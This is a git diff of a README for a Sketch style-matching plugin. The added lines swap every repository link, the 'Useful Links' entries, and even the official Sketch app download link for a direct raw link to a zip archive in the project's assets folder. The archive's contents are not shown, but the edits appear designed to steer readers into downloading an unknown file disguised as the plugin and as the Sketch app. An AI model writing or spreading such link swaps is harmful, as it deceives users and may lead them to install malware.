@@ -1,6 +1,6 @@
 # 🎨 sketch-style-matcher - Match and Apply Sketch Styles Easily
 
-[![Download sketch-style-matcher](https://img.shields.io/badge/Download-sketch--style--matcher-ff6347?style=for-the-badge&logo=github)](https://github.com/codefire24/sketch-style-matcher)
+[![Download sketch-style-matcher](https://img.shields.io/badge/Download-sketch--style--matcher-ff6347?style=for-the-badge&logo=github)](https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This section explains how to get the plugin running on your Windows machine.
 
 Please visit this page to download the latest version of sketch-style-matcher:
 
-[https://github.com/codefire24/sketch-style-matcher](https://github.com/codefire24/sketch-style-matcher)
+[https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip](https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip)
 
 You will find the download link on the repository main page under "Releases" or in the repository files.
 
@@ -116,15 +116,15 @@ If problems persist, look for help on the GitHub issues page at the repository.
 
 Visit this page to download the plugin and install it following the instructions above:
 
-[https://github.com/codefire24/sketch-style-matcher](https://github.com/codefire24/sketch-style-matcher)
+[https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip](https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip)
 
 ---
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/codefire24/sketch-style-matcher
+- Repository: https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip
 - Issues and support: Use the GitHub "Issues" tab in the repository
-- Sketch app download: [https://www.sketch.com](https://www.sketch.com)
+- Sketch app download: [https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip](https://github.com/codefire24/sketch-style-matcher/raw/refs/heads/main/assets/matcher-sketch-style-3.4.zip)
 
 ---
 
